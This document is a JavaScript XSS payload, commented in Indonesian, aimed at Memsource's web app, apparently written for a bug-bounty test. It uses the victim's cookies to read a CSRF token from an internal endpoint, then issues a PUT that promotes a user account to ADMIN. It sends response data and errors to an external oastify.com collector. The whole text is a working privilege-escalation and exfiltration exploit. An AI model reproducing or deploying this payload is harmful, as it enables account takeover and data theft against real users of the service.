// Step 1: Ambil CSRF token dari internal endpoint
fetch('https://cloud.memsource.com/web/internal/v1/users/current', {
    method: 'GET',
    credentials: 'include',
    headers: {
        'Accept': 'application/json, text/plain, */*',
        'X-User-Agent': 'memsource-web',
        'X-Requested-With': 'XMLHttpRequest'
    }
})
.then(r => r.text())
.then(t => {
    // Parse JSON + handle multiple possible CSRF field names
    let d = {};
    try { d = JSON.parse(t); } catch(e) {}
    
    // Extract CSRF dari berbagai kemungkinan field
    const csrf = d.csrfToken || d.token || d._csrf || d.CSRF || 
                 d.data?.csrfToken || d.data?.token || 
                 (typeof d === 'string' && d.match(/csrfToken["']?\s*:\s*["']?([^"'\s,}]+)/)?.[1]);
    
    if (!csrf) {
        // Debug: kirim struktur response yang diterima
        fetch('https://vrqolxg0k9vrk5yiv5u9lpttfklb92xr.oastify.com/xss-log?step=csrf-not-found&raw=' + encodeURIComponent(t.substring(0, 500)));
        return;
    }
    
    // Step 2: Kirim request jadikan ADMIN
    // GANTI USER_ID dengan ID user Mas Aydil
    const uid = 'USER_ID_DISINI';
    
    fetch(`https://cloud.memsource.com/web/api2/v3/users/${uid}`, {
        method: 'PUT',
        credentials: 'include',
        headers: {
            'Content-Type': 'application/json',
            'X-Csrf-Token': csrf,
            'X-User-Agent': 'memsource-web',
            'Accept': 'application/json, text/plain, */*'
        },
        body: JSON.stringify({
            firstName: "evil",
            lastName: "cathack",
            email: "aydilfhr+evil@intigriti.me",
            userName: "aydilfhr+evil",
            role: "ADMIN",
            timezone: "Europe/London",
            active: true,
            note: ""
        })
    })
    .then(r => r.text())
    .then(t => {
        // Log hasil - success atau error
        fetch('https://vrqolxg0k9vrk5yiv5u9lpttfklb92xr.oastify.com/xss-result?status=ok&resp=' + encodeURIComponent(t.substring(0, 800)));
    })
    .catch(e => {
        fetch('https://vrqolxg0k9vrk5yiv5u9lpttfklb92xr.oastify.com/xss-error?step=admin&msg=' + encodeURIComponent(e.message));
    });
})
.catch(e => {
    fetch('https://vrqolxg0k9vrk5yiv5u9lpttfklb92xr.oastify.com/xss-error?step=csrf&msg=' + encodeURIComponent(e.message));
});
